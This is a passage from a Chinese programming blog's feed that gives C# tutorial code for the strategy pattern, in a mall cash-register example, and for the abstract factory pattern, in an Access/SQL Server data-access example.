punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">double</span> <span class="token function">acceptCash</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>CashNormal.cs</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">CashNormal</span> <span class="token punctuation">:</span> CashSuper    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">double</span> <span class="token function">acceptCash</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> money<span class="token punctuation">;</span>        <span class="token punctuation">}</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>CashRebate.cs</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">CashRebate</span> <span class="token punctuation">:</span> CashSuper    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">double</span> moneyRebate <span class="token operator">=</span> 1d<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token function">CashRebate</span><span class="token punctuation">(</span><span class="token keyword">string</span> moneyRebate<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>moneyRebate <span class="token operator">=</span> <span class="token keyword">double</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>moneyRebate<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">double</span> <span class="token function">acceptCash</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> money <span class="token operator">*</span> moneyRebate<span class="token punctuation">;</span>        <span class="token punctuation">}</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>CashReturn.cs</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">CashReturn</span> <span class="token punctuation">:</span> CashSuper    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">double</span> moneyCondition <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">.</span>0d<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">double</span> moneyReturn <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">.</span>0d<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token function">CashReturn</span><span class="token punctuation">(</span><span class="token keyword">string</span> moneyCondition<span class="token punctuation">,</span><span class="token keyword">string</span> moneyReturn<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>moneyCondition <span class="token operator">=</span> <span class="token keyword">double</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>moneyCondition<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>moneyReturn <span class="token operator">=</span> <span class="token keyword">double</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>moneyReturn<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">double</span> <span class="token function">acceptCash</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">double</span> result <span class="token operator">=</span> money<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>money <span class="token operator">>=</span> moneyCondition<span class="token punctuation">)</span>                result<span class="token operator">=</span>money<span class="token operator">-</span> Math<span class="token punctuation">.</span><span class="token function">Floor</span><span class="token punctuation">(</span>money <span class="token operator">/</span> moneyCondition<span class="token punctuation">)</span> <span class="token operator">*</span> moneyReturn<span class="token punctuation">;</span>            <span class="token keyword">return</span> result<span class="token punctuation">;</span>        <span class="token punctuation">}</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>CashContext.cs</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">CashContext</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> CashSuper cs<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//设置上下文中的策略实例对象</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setBehavior</span><span class="token punctuation">(</span>CashSuper csuper<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>cs <span class="token operator">=</span> csuper<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">double</span> <span class="token function">GetResult</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> cs<span class="token punctuation">.</span><span class="token function">acceptCash</span><span class="token punctuation">(</span>money<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>Form1.cs</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Data<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Forms<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Reflection<span class="token punctuation">;</span><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">partial</span> <span class="token keyword">class</span> <span class="token class-name">Form1</span> <span class="token punctuation">:</span> Form    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token function">Form1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">InitializeComponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        DataSet ds<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//用于存放配置文件信息</span>        <span class="token keyword">double</span> total <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">.</span>0d<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//用于总计</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 在程序加载时，读取指定文件中的所有内容</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="sender">&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;param name="e">&lt;/param></span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">Form1_Load</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//读配置文件                     --在程序运行的路径下</span>            ds <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            ds<span class="token punctuation">.</span><span class="token function">ReadXml</span><span class="token punctuation">(</span>Application<span class="token punctuation">.</span>StartupPath <span class="token operator">+</span> <span class="token string">"\\CashAcceptType.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//将读取到的记录绑定到下拉列表框中</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span>DataRowView dr <span class="token keyword">in</span> ds<span class="token punctuation">.</span>Tables<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>DefaultView<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                cbxType<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span>dr<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            cbxType<span class="token punctuation">.</span>SelectedIndex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnOk_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//实例化一个上下文对象</span>            CashContext cc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CashContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//根据用户的选项，查询用户选择项的相关行</span>            DataRow dr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>DataRow<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>ds<span class="token punctuation">.</span>Tables<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">Select</span><span class="token punctuation">(</span><span class="token string">"name='"</span> <span class="token operator">+</span> cbxType<span class="token punctuation">.</span>SelectedItem<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//声明一个参数的对象数组</span>            <span class="token keyword">object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token operator">=</span><span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//若有参数，则将其分割成字符串数组，用于实例化时所用的参数</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>dr<span class="token punctuation">[</span><span class="token string">"para"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">)</span>                args <span class="token operator">=</span> dr<span class="token punctuation">[</span><span class="token string">"para"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Split</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//通过反射实例化出相应的算法对象</span>            cc<span class="token punctuation">.</span><span class="token function">setBehavior</span><span class="token punctuation">(</span><span class="token punctuation">(</span>CashSuper<span class="token punctuation">)</span>Assembly<span class="token punctuation">.</span><span class="token function">Load</span><span class="token punctuation">(</span><span class="token string">"商场管理软件"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">CreateInstance</span><span class="token punctuation">(</span><span class="token string">"商场管理软件."</span> <span class="token operator">+</span> dr<span class="token punctuation">[</span><span class="token string">"class"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">false</span><span class="token punctuation">,</span> BindingFlags<span class="token punctuation">.</span>Default<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> args<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">double</span> totalPrices <span class="token operator">=</span> 0d<span class="token punctuation">;</span>            totalPrices <span class="token operator">=</span> cc<span class="token punctuation">.</span><span class="token function">GetResult</span><span class="token punctuation">(</span>Convert<span class="token punctuation">.</span><span class="token function">ToDouble</span><span class="token punctuation">(</span>txtPrice<span class="token punctuation">.</span>Text<span class="token punctuation">)</span> <span class="token operator">*</span> Convert<span class="token punctuation">.</span><span class="token function">ToDouble</span><span class="token punctuation">(</span>txtNum<span class="token punctuation">.</span>Text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            total <span class="token operator">=</span> total <span class="token operator">+</span> totalPrices<span class="token punctuation">;</span>            lbxList<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">"单价："</span> <span class="token operator">+</span> txtPrice<span class="token punctuation">.</span>Text <span class="token operator">+</span> <span class="token string">" 数量："</span> <span class="token operator">+</span> txtNum<span class="token punctuation">.</span>Text <span class="token operator">+</span> <span class="token string">" "</span><span class="token operator">+</span>cbxType<span class="token punctuation">.</span>SelectedItem<span class="token operator">+</span> <span class="token string">" 合计："</span> <span class="token operator">+</span> totalPrices<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            lblResult<span class="token punctuation">.</span>Text <span class="token operator">=</span> total<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnClear_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            total <span class="token operator">=</span> 0d<span class="token punctuation">;</span>            txtPrice<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"0.00"</span><span class="token punctuation">;</span>            txtNum<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>            lbxList<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            lblResult<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"0.00"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
            <tag> 设计模式 </tag>
            
            <tag> 策略模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>抽象工厂模式</title>
      <link href="/2020/08/22/chou-xiang-gong-han-mo-shi/"/>
      <url>/2020/08/22/chou-xiang-gong-han-mo-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="定义理解"><a href="#定义理解" class="headerlink" title="定义理解"></a>定义理解</h1><p>​        抽象工厂模式（Abstract Factory Pattern）属于<strong>类的创建型模式</strong>，是对工厂方法模式的升级。提供一个创建一系列相关或相互依赖对象的接口，而无需指定它们具体的类。</p><p>​        工厂方法模式是为了克服简单工厂模式随着产品类的增加需要增加额外的代码的缺点而诞生的，而抽象工厂针对工厂方法只能针对一个产品等级结构而扩展延伸的。</p><h1 id="角色与职责"><a href="#角色与职责" class="headerlink" title="角色与职责"></a>角色与职责</h1><ul><li><p>抽象产品(AbstractProduct)：</p><p>定义部分具体产品的轮廓，在创建具体产品时使用多态性实现对具体产品的动态声明。</p></li><li><p>具体产品(ConcreteProduct)：</p><p>抽象产品的具体实现，可扩展但在该模式下扩展无效。</p></li><li><p>抽象工厂接口(AbstractFactory)</p><p>定义部分工厂的轮廓，在运行中实现对工厂的动态创建。</p></li><li><p>具体工厂接口(ConcreteFactory)：</p><p>创建某个具体产品的实例，但以抽象产品引用返回实例。</p></li></ul><h1 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h1><ul><li>创建抽象产品类/接口（定义产品的特性、动作等）</li><li>创建具体产品类（继承自抽象产品，并实现抽象产品中定义的方法）</li><li>创建抽象工厂类/接口（定义工厂的特性、动作等）</li><li>创建具体工厂类（继承自抽象工厂，并实现抽象工厂中定义的方法）</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/抽象工厂模式/经典抽象工厂.png" alt="经典抽象工厂"></center><h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><p><strong>抽象工厂模式</strong>：</p><p>​        屏蔽掉具体类的创建方法。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/抽象工厂模式/用抽象工厂模式的数据库访问程序.jpg" alt="用抽象工厂模式的数据库访问程序"></center><p><strong>实体类</strong>：</p><p>User:</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> AbstractFactory<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">User</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">int</span> _id<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">int</span> ID        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> _id<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> _id <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> _name<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> Name        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> _name<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> _name <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>Department:</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> AbstractFactory<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Department</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">int</span> _id<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">int</span> ID        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> _id<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> _id <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> _deptName<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> DeptName        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> _deptName<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> _deptName <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>抽象产品</strong>：</p><p>IUser:</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> AbstractFactory<span class="token punctuation">{</span>    <span class="token keyword">interface</span> <span class="token class-name">IUser</span>    <span class="token punctuation">{</span>        <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span><span class="token punctuation">;</span>        User <span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>IDepartment:</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> AbstractFactory<span class="token punctuation">{</span>    <span class="token keyword">interface</span> <span class="token class-name">IDepartment</span>    <span class="token punctuation">{</span>        <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>Department department<span class="token punctuation">)</span><span class="token punctuation">;</span>        Department <span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>具体产品</strong>：</p><p>AccessUser：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> AbstractFactory<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">AccessUser</span> <span class="token punctuation">:</span> IUser    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Access中给User表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> User <span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Access中根据ID得到User表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>SqlserverUser:</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> AbstractFactory<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">SqlserverUser</span> <span class="token punctuation">:</span> IUser    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Sqlserver中给User表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> User <span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Sqlserver中根据ID得到User表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>AccessDepartment:</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> AbstractFactory<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">AccessDepartment</span> <span class="token punctuation">:</span> IDepartment    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>Department department<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Access中给Department表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> Department <span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Access中根据ID得到Department表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>SqlserverDepartment:</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> AbstractFactory<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">SqlserverDepartment</span> <span class="token punctuation">:</span> IDepartment    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>Department department<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Sqlserver中给Department表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> Department <span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Sqlserver中根据ID得到Department表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>抽象工厂</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> AbstractFactory<span class="token punctuation">{</span>    <span class="token keyword">interface</span> <span class="token class-name">IFactory</span>    <span class="token punctuation">{</span>        IUser <span class="token function">CreateUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        IDepartment <span class="token function">CreateDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>具体工厂</strong>：</p><p>AccessFactory:</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> AbstractFactory<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">AccessFactory</span> <span class="token punctuation">:</span> IFactory    <span class="token punctuation">{</span>        <span class="token keyword">public</span> IUser <span class="token function">CreateUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">AccessUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> IDepartment <span class="token function">CreateDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">AccessDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>SqlServerFactory:</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> AbstractFactory<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">SqlServerFactory</span> <span class="token punctuation">:</span> IFactory    <span class="token punctuation">{</span>        <span class="token keyword">public</span> IUser <span class="token function">CreateUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">SqlserverUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> IDepartment <span class="token function">CreateDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">SqlserverDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>测试类</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> AbstractFactory<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/// &lt;summary></span>    <span class="token comment" spellcheck="true">/// 测试类</span>    <span class="token comment" spellcheck="true">/// &lt;/summary></span>    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// User实体</span>            User user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// Department实体</span>            Department dept <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Department</span><span class="token punctuation">(</span><span class="token 